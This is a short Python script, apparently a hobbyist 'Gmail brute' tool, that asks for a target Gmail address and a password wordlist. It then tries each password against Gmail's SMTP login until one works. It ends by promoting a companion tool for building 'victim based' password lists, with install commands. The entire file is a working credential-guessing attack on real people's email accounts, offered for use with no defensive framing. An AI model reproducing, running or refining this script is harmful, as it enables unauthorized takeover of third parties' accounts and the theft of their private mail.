import smtplib
import os
import sys
import time

os.system("clear")

red = '\033[31m'
yellow = '\033[93m'
green = '\033[92m'
clear = '\033[0m'
bold = '\033[01m'
cyan = '\033[96m'
cy='\033[095m'

def hprint(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(8.0 / 100)

print(yellow,"""

   :::=====  :::=======  :::====  ::: :::     
   :::       ::: === === :::  === ::: :::     
   === ===== === === === ======== === ===     
   ===   === ===     === ===  === === ===     
    =======  ===     === ===  === === ========
                                            """,green,"""
   :::====  :::====  :::  === :::==== :::=====
   :::  === :::  === :::  === :::==== :::     
   =======  =======  ===  ===   ===   ======  
   ===  === === ===  ===  ===   ===   ===     
   =======  ===  ===  ======    ===   ========
    """)
hprint(green + "    [✓] Owner : Anontemitayo\n")
hprint(green + "    [✓] Github : github.com/Anontemitayo \n \n ")
   
smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()

user = input("  Enter The Target Gmail : " + yellow)

print("\n")

passswfile = input(green + "  Enter Password list path  : " + yellow )

passswfile = open(passswfile, "r").readlines()

if not user.endswith("@gmail.com"):
  	print(red,"Only Gmail accounts can be bruteforced with this tool")
  	sys.exit()
  	
for password in passswfile:
    try:
        smtpserver.login(user, password)

        print(green,"[+] Password Found <==> %s\n" % password)
        break
           

    except smtplib.SMTPAuthenticationError:
        print(yellow,"\n [!] Password incorrect <==> %s \n" % password)
hprint(green + """
    	Use Passmaker by me for making a victim based password list """) 
print("""    	apt update 

        apt upgrade

        apt install python
 
        apt install git

        git clone https://github.com/Anontemitayo/Passmaker

        cd Passmaker

        Run

        For termux :

        python Passmaker.py

        For Linux

        python3 Passmaker.py """)

hprint("\n Don't forget to follow me for more tools💘")